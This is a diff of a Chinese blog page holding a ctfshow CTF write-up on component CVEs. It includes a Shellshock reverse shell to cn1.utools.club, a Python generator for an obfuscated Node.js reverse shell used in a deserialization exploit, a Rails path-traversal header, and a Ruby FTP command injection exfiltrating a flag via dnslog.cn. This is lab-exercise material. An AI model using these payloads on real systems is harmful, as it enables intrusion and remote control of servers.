@@ -21,14 +21,14 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="author" content="dr0n">
-  <meta name="keywords" content="">
+  <meta name="keywords" content="ctf, writeups, web, misc">
   
-    <meta name="description" content="WEB580–WEB599   WEB580根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）payload：() &#123; :; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;d">
+    <meta name="description" content="WEB580–WEB599   WEB580根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）payload：() { :; }; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;cn1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【ctfshow】web入门-组件漏洞">
 <meta property="og:url" content="https://www.dr0n.top/posts/605e5ac9/index.html">
 <meta property="og:site_name" content="Dr0n&#39;s blog">
-<meta property="og:description" content="WEB580–WEB599   WEB580根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）payload：() &#123; :; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;d">
+<meta property="og:description" content="WEB580–WEB599   WEB580根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）payload：() { :; }; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;cn1">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E.png">
 <meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/web580-1.png">
@@ -74,8 +74,8 @@
 <meta property="article:published_time" content="2021-06-18T08:36:00.000Z">
 <meta property="article:modified_time" content="2025-07-27T09:45:59.766Z">
 <meta property="article:author" content="dr0n">
-<meta property="article:tag" content="wp">
 <meta property="article:tag" content="ctfshow-web入门">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E.png">
   
@@ -119,7 +119,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9,"expand_all":true},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"openkounter":{"server_url":"https://openkounter-1lbvmren.edgeone.cool/","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -153,13 +153,11 @@
   
 
   
-    
-  
 
 
 
   
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
 </head>
 
 
@@ -327,7 +325,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3k 字
+          2.9k 字
         
       </span>
     
@@ -338,20 +336,13 @@
         
         
         
-          20 分钟
+          22 分钟
         
       </span>
     
 
     
     
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
       
     
   </div>
@@ -393,7 +384,7 @@
 <p>WEB580–WEB599</p>
 </blockquote>
 <p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E.png" srcset="/img/loading.gif" lazyload></p>
-<h1 id="WEB580"><a href="#WEB580" class="headerlink" title="WEB580"></a>WEB580</h1><p>根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）<br>这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）<br>payload：<br><code>() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/37634 0&gt;&amp;1;</code><br>发送如下数据包</p>
+<h1 id="WEB580"><a href="#WEB580" class="headerlink" title="WEB580"></a>WEB580</h1><p>根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）<br>这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）<br>payload：<br><code>() { :; }; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/37634 0&gt;&amp;1;</code><br>发送如下数据包</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /cgi-bin/index.cgi HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">7</span>f35523e-<span class="hljs-number">4939</span>-<span class="hljs-number">43</span>d8-<span class="hljs-number">8</span>a05-f6348618a843.challenge.ctf.show:<span class="hljs-number">8080</span><br><span class="hljs-attribute">Pragma</span>: no-cache<br><span class="hljs-attribute">Cache</span>-Control: no-cache<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">lewiserii</span>: () &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/<span class="hljs-number">37634</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>;<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">91</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4472</span>.<span class="hljs-number">106</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">7</span>f35523e-<span class="hljs-number">4939</span>-<span class="hljs-number">43</span>d8-<span class="hljs-number">8</span>a05-f6348618a843.challenge.ctf.show:<span class="hljs-number">8080</span>/cgi-bin/victim.cgi<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: UM_distinctid=<span class="hljs-number">179</span>eb628608d03-<span class="hljs-number">066</span>c8283766a21-f7f1939-<span class="hljs-number">1</span>bcab9-<span class="hljs-number">179</span>eb62860986d<br><span class="hljs-attribute">Connection</span>: close<br><br></code></pre></td></tr></table></figure>
 <p>拿到shell<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web580-1.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="WEB581"><a href="#WEB581" class="headerlink" title="WEB581"></a>WEB581</h1><p>具体可以参考<a target="_blank" rel="noopener" href="https://paper.seebug.org/334/">CVE-2017-6920</a><br>payload：</p>
@@ -402,7 +393,7 @@
 <p>只要带上!php&#x2F;object  后面就会进行反序列化<br>写入文件后访问<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web581-1.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="WEB582"><a href="#WEB582" class="headerlink" title="WEB582"></a>WEB582</h1><p>nodejsshell.py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span> % (sys.argv[<span class="hljs-number">0</span>])<br>    sys.exit(<span class="hljs-number">0</span>)<br><br>IP_ADDR = sys.argv[<span class="hljs-number">1</span>]<br>PORT = sys.argv[<span class="hljs-number">2</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">charencode</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;String.CharCode&quot;&quot;&quot;</span><br>    encoded = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> string:<br>        encoded = encoded + <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(char))<br>    <span class="hljs-keyword">return</span> encoded[<span class="hljs-number">1</span>:]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] LHOST = %s&quot;</span> % (IP_ADDR)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] LPORT = %s&quot;</span> % (PORT)<br>NODEJS_REV_SHELL = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">var net = require(&#x27;net&#x27;);</span><br><span class="hljs-string">var spawn = require(&#x27;child_process&#x27;).spawn;</span><br><span class="hljs-string">HOST=&quot;%s&quot;;</span><br><span class="hljs-string">PORT=&quot;%s&quot;;</span><br><span class="hljs-string">TIMEOUT=&quot;5000&quot;;</span><br><span class="hljs-string">if (typeof String.prototype.contains === &#x27;undefined&#x27;) &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;</span><br><span class="hljs-string">function c(HOST,PORT) &#123;</span><br><span class="hljs-string">    var client = new net.Socket();</span><br><span class="hljs-string">    client.connect(PORT, HOST, function() &#123;</span><br><span class="hljs-string">        var sh = spawn(&#x27;/bin/sh&#x27;,[]);</span><br><span class="hljs-string">        client.write(&quot;Connected!\\n&quot;);</span><br><span class="hljs-string">        client.pipe(sh.stdin);</span><br><span class="hljs-string">        sh.stdout.pipe(client);</span><br><span class="hljs-string">        sh.stderr.pipe(client);</span><br><span class="hljs-string">        sh.on(&#x27;exit&#x27;,function(code,signal)&#123;</span><br><span class="hljs-string">          client.end(&quot;Disconnected!\\n&quot;);</span><br><span class="hljs-string">        &#125;);</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">    client.on(&#x27;error&#x27;, function(e) &#123;</span><br><span class="hljs-string">        setTimeout(c(HOST,PORT), TIMEOUT);</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">c(HOST,PORT);</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> % (IP_ADDR, PORT)<br><br><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Encoding&quot;</span><br>PAYLOAD = charencode(NODEJS_REV_SHELL)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;eval(String.fromCharCode(%s))&quot;</span> % (PAYLOAD)<br></code></pre></td></tr></table></figure>
-<p>通过nodejsshell.py生成payload<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web582-1.png" srcset="/img/loading.gif" lazyload><br>放入<code>&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function ()&#123;生成的payload&#125;()&quot;,&quot;password&quot;:123&#125;</code>,然后base64编码加url编码<br>bp抓包，构造一个user并传入payload<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web582-2.png" srcset="/img/loading.gif" lazyload><br>成功反弹shell<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web582-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过nodejsshell.py生成payload<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web582-1.png" srcset="/img/loading.gif" lazyload><br>放入<code>{&quot;username&quot;:&quot;_$$ND_FUNC$$_function (){生成的payload}()&quot;,&quot;password&quot;:123}</code>,然后base64编码加url编码<br>bp抓包，构造一个user并传入payload<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web582-2.png" srcset="/img/loading.gif" lazyload><br>成功反弹shell<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web582-3.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="WEB583"><a href="#WEB583" class="headerlink" title="WEB583"></a>WEB583</h1><p>CVE-2016-10033<br>在github上找到了<a target="_blank" rel="noopener" href="https://github.com/opsxcq/exploit-CVE-2016-10033">exp</a><br>直接打就行了<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web583-1.png" srcset="/img/loading.gif" lazyload></p>
 <p>但是这里有个地方要注意<br>现在（6.17）github上的exp是打不通的<br>我把这个和以前在github上下的版本用beyond比对了一下<br>！ 竟然不一样，如果你用官网的打不通可以试试我这个<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1PHYAEyRyubLVZw8cc-iscg">版本</a>,提取码是f3rw<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web583-2.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="WEB584"><a href="#WEB584" class="headerlink" title="WEB584"></a>WEB584</h1><p>生成数字exp(将echo后的内容替换成你自己的反弹一句话)</p>
@@ -451,13 +442,13 @@
 <p>Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e&#x2F;来跨越到根目录，读取或执行目标服务器上任意文件。</p>
 <p>直接访问IP&#x2F;assets&#x2F;file:%2f%2f&#x2F;etc&#x2F;passwd，将会报错，因为文件&#x2F;etc&#x2F;passwd不在允许的目录中：<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web597-1.png" srcset="/img/loading.gif" lazyload><br>在上方的报错中随意选择一个路径利用..&#x2F;返回上一级，成功实现任意文件读取<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web597-2.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="WEB598"><a href="#WEB598" class="headerlink" title="WEB598"></a>WEB598</h1><p>Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）</p>
-<p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入<code>Accept: ../../../../../../../../etc/passwd&#123;&#123;</code>头来构成构造路径穿越漏洞，读取任意文件。</p>
+<p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入<code>Accept: ../../../../../../../../etc/passwd{{</code>头来构成构造路径穿越漏洞，读取任意文件。</p>
 <p>访问&#x2F;robots并抓包传入Accept<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web598-1.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="WEB599"><a href="#WEB599" class="headerlink" title="WEB599"></a>WEB599</h1><p>Ruby Net::FTP 模块命令注入漏洞（CVE-2017-17405）<br>这一题做的时间比较久，一直反弹不出来，最后向bit师傅学到了一个新的姿势</p>
 <p>因为这是一个FTP客户端的漏洞，所以我们需要先运行一个可以被访问到的服务端。比如使用python：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 安装pyftpdlib</span><br><span class="hljs-attribute">pip</span> install pyftpdlib<br><br><span class="hljs-comment"># 在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:2121`端口</span><br><span class="hljs-attribute">python3</span> -m pyftpdlib -p <span class="hljs-number">2121</span> -i <span class="hljs-number">0.0.0.0</span><br></code></pre></td></tr></table></figure>
 <p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-1.png" srcset="/img/loading.gif" lazyload><br>然后即可开始利用漏洞。发送如下数据包即可（填上你的FTP服务器的ip和端口，空格要用${IFS}代替，使用前先在<a target="_blank" rel="noopener" href="http://dnslog.cn/">dnslog.cn</a>创建一个子域名用来接收数据(替换下面的子域名)）：</p>
-<p><code>IP/download?uri=ftp://FTPIP:FTPPORT/&amp;file=|ping$&#123;IFS&#125;$FLAG.qfy4pq.dnslog.cn$&#123;IFS&#125;-c$&#123;IFS&#125;2</code><br>观察ftp服务器，收到数据包<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-2.png" srcset="/img/loading.gif" lazyload><br>dnslog收到数据<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-3.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>IP/download?uri=ftp://FTPIP:FTPPORT/&amp;file=|ping${IFS}$FLAG.qfy4pq.dnslog.cn${IFS}-c${IFS}2</code><br>观察ftp服务器，收到数据包<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-2.png" srcset="/img/loading.gif" lazyload><br>dnslog收到数据<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-3.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -722,23 +713,6 @@
   
 
   
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
 
 </div>
 
@@ -906,8 +880,6 @@
 
 
   <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
